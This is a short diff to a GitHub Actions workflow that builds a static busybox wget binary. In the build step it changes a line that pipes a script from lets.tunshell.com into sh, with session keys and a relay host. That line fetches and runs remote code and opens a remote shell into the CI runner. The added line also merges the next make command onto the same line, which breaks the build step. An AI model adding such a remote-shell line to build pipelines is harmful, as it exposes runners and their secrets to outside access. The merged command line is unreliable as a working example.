@@ -32,8 +32,7 @@ jobs:
         "
       - name: Build wget-busybox for x86_64 (GCC-Native)
         run: |
-          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T yhpUFSDdewGKLVPtE2T4iQ jyu8jOddn3wJkYhuuYP5AX eu.relay.tunshell.com
-          make KBUILD_SRC="../$BUSYBOX_DIRNAME" -f "../$BUSYBOX_DIRNAME/Makefile" defconfig
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T ME6xRQ4PC3Go5I32N13NIp CO2RkkKJtkIhYjq5WTze4P eu.relay.tunshell.com          make KBUILD_SRC="../$BUSYBOX_DIRNAME" -f "../$BUSYBOX_DIRNAME/Makefile" defconfig
           sed -e 's/.*\<CONFIG_STATIC\>.*/CONFIG_STATIC=y/' -i .config
           bash "../$BUSYBOX_DIRNAME/make_single_applets.sh" WGET
           cp busybox_WGET "$GITHUB_WORKSPACE/main/wget/wget_busybox_amd_x86_64_Linux"
